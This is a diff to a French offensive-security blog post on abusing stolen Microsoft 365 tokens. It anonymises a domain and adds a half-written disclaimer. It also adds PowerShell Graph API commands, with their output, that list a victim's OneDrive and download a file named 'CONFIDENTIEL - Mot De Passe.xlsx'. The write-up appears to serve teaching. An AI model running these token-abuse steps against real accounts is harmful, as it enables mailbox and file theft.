@@ -18,6 +18,8 @@ Ceci dit, il y a un point "négatif" à cette technique, elle doit être exécut
 
 L'attaque ce décompse en 3 étapes que nous vérrons dans cet article. 
 
+
+** Les codes et tokens présent dans ce post sont tous 
 ## Exploitation
 
 ### Installation
@@ -91,7 +93,7 @@ Une fois les tokens récupéré, il nous suffit de les mettres dans ``Burp Suite
 ### Accès à la boîte mail
 
 ````
-RefreshTo-OutlookToken -Domain csgv.com
+RefreshTo-OutlookToken -Domain domaine.com
 ✓  Token acquired and saved as $OutlookToken
 
 token_type     : Bearer
@@ -114,3 +116,38 @@ scope          : https://outlook.office365.com/Branford-Internal.ReadWrite
 expires_in     : 8427
 ext_expires_in : 8427
 ````
+
+### Télécharger des fichiers du OneDrive
+
+#### Lister les fichiers
+````Powershell 
+Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root/children" -Headers $headers | Select-Object -ExpandProperty value | Select-Object name, lastModifiedDateTime, id;
+
+name                             lastModifiedDateTime  id
+----                             --------------------  --
+Attachments                      8/31/2025 2:36:01 PM  014VYX6YNUSZLFDVH7WRBZAVZ6O6LIL5MM
+Documents                        3/2/2026 5:07:41 PM   014VYX6YJTOFX337GDJVBII66ODFTMKISU
+Enregistrements                  2/18/2026 12:53:31 PM 014VYX6YPJLIEHCLCDSRELCIIROFDQ3VBU
+Microsoft Copilot Chat Files     2/3/2026 4:17:45 PM   014VYX6YINFFJN2A765BAYLARQLWISTU4B
+Réunions                         2/18/2026 12:53:31 PM 014VYX6YKW5QDNVJEM25AL3IYX4DWLZZH7
+Book.xlsx                        3/2/2026 5:03:41 PM   014VYX6YI6RT3WZRGJRVBLWKZLVV7ZVJFW
+CONFIDENTIEL - Mot De Passe.xlsx 9/16/2026 10:01:52 AM 014VYX6YISN5DAJWZUQ5CZLQBSKUNWRBA6
+Document 1.docx                  12/3/2025 9:14:23 AM  014VYX6YOKOMC4J6NJSRELZYCIVKU57I76
+Document.docx                    12/3/2025 9:13:40 AM  014VYX6YOEC53VC4UJGFGZDQAUW5DV5BDU
+Example.csv                      9/11/2025 3:30:43 PM  014VYX6YJK2XBARNZQHRH3BECG6NCZKVRO
+Example.xlsx                     9/11/2025 3:54:02 PM  014VYX6YME7J26GJ7QHNE2GPWIISOLQDYI
+exos forensic linux.docx         4/23/2026 3:56:56 PM  014VYX6YM4OFMOORVJZFGZFRGBJJH4NSHF
+forensic linux.docx              4/23/2026 3:49:11 PM  014VYX6YJT77V6WJ44HZDY7LMNDQASSMT3
+hta.hta.zip                      3/2/2026 5:47:37 PM   014VYX6YIFIZYNHN72XJELZWN7PUYFSMYN
+RAPPORT D’AUDIT.docx             12/5/2025 11:48:29 AM 014VYX6YLU7P2NMBEPRJAJ4CKENVK5K4ZP
+SECURITE OFFENSIVE - ESGI 1.pptx 9/8/2025 12:41:44 PM  014VYX6YO46LFODOWMDFBJNCL5X2NANYYR
+````
+
+#### Les télécharger en locale 
+Ici le fichier qui m'intéresse c'est `CONFIDENTIEL - Mot De Passe`, nous pouvons donc le télécharger avec la commande suivante : 
+````Powershell
+Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/items/014VYX6YISN5DAJWZUQ5CZLQBSKUNWRBA6/content" -Headers $headers -OutFile "./CONFIDENTIEL - Mot De Passe.xlsx"
+ls
+CONFIDENTIEL - Mot De Passe.xlsx
+````
+Et voilà, nous pouvons maintenant le fichier téléchargé.
